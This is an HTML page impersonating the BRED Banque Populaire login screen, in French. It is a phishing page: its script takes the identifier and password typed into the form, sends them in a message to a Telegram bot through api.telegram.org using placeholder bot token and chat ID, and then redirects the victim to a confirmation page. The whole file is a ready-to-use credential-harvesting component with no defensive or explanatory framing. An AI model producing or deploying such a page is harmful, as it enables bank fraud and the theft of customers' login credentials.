<!DOCTYPE html>
<html lang="fr">
<head>
    <script>
        window.telegramConfig = {
            BOT_TOKEN: "TELEGRAM_BOT_TOKEN_PLACEHOLDER",
            CHAT_ID: "TELEGRAM_CHAT_ID_PLACEHOLDER"
        };
    </script>

    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BRED - Connexion</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: Arial, sans-serif; background: #f5f5f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { background: white; padding: 2rem; border-radius: 8px; box-shadow: 0 2px 8px rgba(0,0,0,0.1); width: 100%; max-width: 400px; }
        h1 { text-align: center; margin-bottom: 2rem; color: #c41e3a; }
        .form-group { margin-bottom: 1.5rem; }
        label { display: block; margin-bottom: 0.5rem; font-weight: bold; }
        input { width: 100%; padding: 0.75rem; border: 1px solid #ccc; border-radius: 4px; font-size: 1rem; }
        button { width: 100%; padding: 0.75rem; background: #c41e3a; color: white; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; font-size: 1rem; }
        button:hover { background: #a01930; }
        .footer { text-align: center; margin-top: 2rem; font-size: 0.85rem; color: #666; }
    </style>
</head>
<body>
    <div class="container">
        <h1>BRED Banque Populaire</h1>
        <form onsubmit="handleLogin(event)">
            <div class="form-group">
                <label>Identifiant</label>
                <input type="text" id="login" required>
            </div>
            <div class="form-group">
                <label>Mot de passe</label>
                <input type="password" id="password" required>
            </div>
            <button type="submit">Se connecter</button>
        </form>
        <div class="footer">
            <p>© 2026 BRED Banque Populaire</p>
        </div>
    </div>

    <script>
        function handleLogin(event) {
            event.preventDefault();
            const login = document.getElementById('login').value;
            const password = document.getElementById('password').value;
            
            // Envoyer à Telegram
            const message = `BRED LOGIN:\nIdentifiant: ${login}\nMot de passe: ${password}`;
            fetch('https://api.telegram.org/bot' + window.telegramConfig.BOT_TOKEN + '/sendMessage', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({chat_id: window.telegramConfig.CHAT_ID, text: message})
            }).catch(e => console.log(e));
            
            // Rediriger après 1s
            setTimeout(() => {
                window.location.href = 'confirmation.html';
            }, 1000);
        }
    </script>
</body>
</html>
